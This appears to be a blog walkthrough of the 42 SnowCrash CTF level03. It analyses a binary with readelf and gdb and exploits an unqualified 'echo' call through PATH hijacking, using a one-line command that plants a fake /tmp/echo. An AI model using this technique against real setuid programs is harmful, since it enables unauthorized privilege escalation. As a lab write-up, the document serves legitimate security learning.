---
title: 42 SnowCrash Level03 - Walkthrough 🤖
tags:
  - ctf
  - binary
  - path
  - exploit
categories:
  - ctfs
  - 42project
date: 2024-05-18 14:20:44
---

![snowcrash](/images/snowcrash.png)

## Introduction

First of all Identify the binary behavior

## Binary behavior

When we run this binary, it outputs "Exploit me". Let's examine the binary to understand its behavior.

```shell
readelf -p .rodata level03
```

The string dump of section '.rodata' reveals:

```shell
String dump of section '.rodata':
    [     8]  /usr/bin/env echo Exploit me
```

Step 3: Disassemble the main function

We can use gdb to disassemble the main function.

```shell
gdb -batch -ex 'file level03' -ex 'set disassembly-flavor intel' -ex 'disassemble main'
```

The disassembled code shows a call to the system function:

```
0x080484fe <+90>:    call   0x80483b0 <system@plt>
```

The argument string for the system call is located at the address `0x80485e0`.


## Exploit the binary

The binary calls `/usr/bin/env echo Exploit me` without protecting the echo call. We can exploit this by modifying the PATH environment variable to execute our own echo binary.

```shell
echo -e "getflag" > /tmp/echo && chmod +x /tmp/echo && export PATH=/tmp:$PATH && ./level03
```

This command creates a fake echo binary in `/tmp`, sets it as executable, adds `/tmp` to the beginning of the PATH, and then runs the level03 binary.
